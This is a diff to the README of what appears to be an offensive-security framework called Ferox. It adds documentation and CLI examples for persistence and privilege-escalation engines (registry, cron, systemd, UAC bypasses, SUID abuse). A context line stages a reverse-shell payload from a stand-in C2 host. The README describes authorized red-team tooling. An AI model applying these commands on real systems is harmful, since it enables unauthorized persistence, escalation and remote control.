@@ -57,6 +57,19 @@ cargo build --release --features memory-forensics
 - Exploitation (authorized)
 - Post-exploitation: credentials, persistence, lateral movement
 
+### 🔒 Post-Exploitation Engines (Phase 5)
+- **Persistence Engine**: Multi-platform persistence with 14 methods
+  - Windows: Registry Run, Scheduled Tasks, WMI Events, Services, Startup Folder
+  - Linux: Cron, Systemd, Shell RC, XDG Autostart
+  - macOS: Launch Agents/Daemons, Login Items
+  - Auto-select based on privileges and stealth requirements
+  - Built-in redundancy support
+- **Privilege Escalation Engine**: Comprehensive privesc enumeration
+  - Windows: UAC Bypass (fodhelper, eventvwr, sdclt), Token Impersonation, Service Exploits
+  - Linux: Sudo abuse, SUID/SGID binaries, Kernel exploits, Capabilities
+  - MITRE ATT&CK mapping for all techniques
+  - GTFOBins integration references
+
 ### 🗂 System Management
 - SQLite session tracking
 - Tamper-proof audit logs
@@ -120,6 +133,37 @@ ferox (payloads/rev_tcp_fileless)> set C2_URL https://c2.example.com/stage2
 ferox (payloads/rev_tcp_fileless)> run
 ```
 
+### Persistence Engine
+```bash
+# List all persistence methods
+ferox persist list
+
+# Auto-install persistence (safe mode)
+ferox persist auto --platform windows --payload /path/to/agent --redundancy 2
+
+# Show method details
+ferox persist describe registry_run_hkcu
+
+# Verify/remove persistence
+ferox persist verify
+ferox persist remove
+```
+
+### Privilege Escalation Engine
+```bash
+# List available enumerators
+ferox privesc list
+
+# Auto-enumerate and exploit (safe mode)
+ferox privesc auto --platform windows --command cmd.exe
+
+# Enumerate specific platform
+ferox privesc enumerate --platform linux --category sudo
+
+# Show technique details
+ferox privesc describe uac_bypass
+```
+
 ## 🎨 Interface — Mixed Predator Theme
 - Dark, high-contrast security palette
 - Minimal animations (calm UI)
@@ -136,7 +180,7 @@ SAFE_MODE=1 ferox console
 ```text
 Ferox CLI Integration Layer
        ↓
-[doctor, memory, c2, sessions, console, payloads]
+[doctor, memory, c2, sessions, persist, privesc, console]
        ↓
 Module Registry & Session Manager
        ↓
@@ -144,7 +188,11 @@ Security Engine (Async Rust)
        ↓
 [Scanner, Recon, Exploit, Payloads, Memory, C2, Post, Auxiliary]
        ↓
-Smart Payload Engine (AES-256-GCM, HKDF, Multi-Stage)
+┌─────────────────────────────────────────────────────────────┐
+│  Smart Payload Engine (AES-256-GCM, HKDF, Multi-Stage)      │
+│  Persistence Engine (14 methods, 3 platforms)               │
+│  Privilege Escalation Engine (7 enumerators, 2+ exploits)   │
+└─────────────────────────────────────────────────────────────┘
 ```
 
 ## 📦 Module Categories
@@ -155,7 +203,7 @@ Smart Payload Engine (AES-256-GCM, HKDF, Multi-Stage)
 | Exploit | 4 | Authorized exploitation |
 | **Payloads** | 3 | Smart payload generation with encryption |
 | Memory Forensics | 8 | Volatility3 workflows |
-| Post-Exploitation | 7 | Credentials, persistence |
+| **Post-Exploitation** | 14+ | Persistence (14 methods), PrivEsc (7 enumerators) |
 | C2 & Evasion | 12 | Communication & stealth |
 | Auxiliary | 5 | Utility modules |
 
@@ -210,6 +258,7 @@ ferox doctor check --format markdown
 ## 🛣️ Roadmap
 - [x] v2.0.0 – Memory forensics engine
 - [x] **Phase 4** – Smart Payload System with execution command generators
+- [x] **Phase 5** – Persistence & Privilege Escalation Engines
 - [ ] Signed plugin marketplace
 - [ ] Web operator dashboard
 - [ ] Hardware-backed credential vault
